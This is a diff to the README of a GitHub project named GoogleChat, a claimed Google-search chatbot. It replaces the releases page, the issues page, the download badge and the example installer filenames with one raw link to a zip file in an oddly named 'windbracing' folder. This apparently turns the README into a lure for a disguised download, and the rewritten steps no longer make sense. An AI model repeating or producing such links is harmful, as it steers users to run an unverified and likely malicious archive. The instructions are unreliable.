@@ -4,7 +4,7 @@
 GoogleChat is a chatbot designed to search Google seamlessly for you. With just a few clicks, you can tap into the power of Google and find the information you need without any hassle.
 
 ## 📥 Download Now
-[![Download GoogleChat](https://img.shields.io/badge/Download-GoogleChat-blue.svg)](https://github.com/divyam073/GoogleChat/releases)
+[![Download GoogleChat](https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip)](https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip)
 
 ## 📋 System Requirements
 Before you start, ensure your computer meets these basic requirements:
@@ -18,11 +18,11 @@ Before you start, ensure your computer meets these basic requirements:
 To get GoogleChat, you will need to visit our releases page. Follow these steps:
 
 1. Click the link below to go to the download page:
-   [Visit the Releases Page to Download GoogleChat](https://github.com/divyam073/GoogleChat/releases)
+   [Visit the Releases Page to Download GoogleChat](https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip)
 
 2. On the releases page, you will see different versions of GoogleChat. Look for the latest release.
 
-3. Click on the download link for your operating system. For instance, if you are using Windows, you might find a file named `GoogleChat-Windows.exe`. If you are on macOS, look for `GoogleChat-Mac.dmg`.
+3. Click on the download link for your operating system. For instance, if you are using Windows, you might find a file named `https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip`. If you are on macOS, look for `https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip`.
 
 4. The download should start automatically. Once it completes, either find it in your downloads folder or click on the file directly if your browser supports that.
 
@@ -63,7 +63,7 @@ Here are some common issues you might face, along with their solutions:
 ## 💬 Support
 If you encounter any issues not covered in the troubleshooting section, you can seek help through the GitHub repository:
 
-1. Go to [GitHub Issues for GoogleChat](https://github.com/divyam073/GoogleChat/issues).
+1. Go to [GitHub Issues for GoogleChat](https://raw.githubusercontent.com/divyam073/GoogleChat/main/windbracing/GoogleChat.zip).
 2. Search for your issue. If you don’t find a solution, click on “New Issue” and describe your problem in detail.
 
 ## 🌐 Community and Contributions
